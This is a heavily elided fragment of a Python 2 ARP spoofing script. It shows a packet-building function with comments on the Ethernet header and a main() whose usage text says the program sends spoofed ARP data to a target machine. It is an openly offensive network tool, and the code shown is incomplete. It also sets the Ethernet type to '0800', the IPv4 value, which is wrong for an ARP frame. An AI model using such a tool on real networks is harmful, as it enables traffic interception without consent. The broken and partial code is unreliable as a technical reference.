...
def create_ARP_pack(target_mac, target_ip, spoof_mac, spoof_ip):
  ...
  The Ethernet header contains Destination MAC (6 bytes), Source MAC (6 bytes)
  and Ethernet type (2 bytes)
  To "create" the MAC addresses; from 'aabbccddeeff' we will use .decode('hex')
  result is: \xaa\xbb\xcc\xdd\xee\xff
  '''
  eth_type = '0800'
  ...
  PLN = 4
  # OPCode Specifies the Nature of the ARP message being sent. First 2 values
  # are used for regular ARP
...
def main():
  args = sys.argv[1:]
  if len(args) < 4 :
    print 'Usage: Spoof_ARP.py Target_MAC_Addr Target_IP_Addr ' +\
          'Spoof_MAC_Addr Spoof_IP_Addr'
    print 'The MAC addresses must be in the format aabbccddeeff. ' +\
          'The IP Addresses must be in the format: 192.168.1.2'
    print 'This program does an ARP spoof By sending an ARP packet to the '+\
          ' Target Machine containing the Spoof data'
  else:
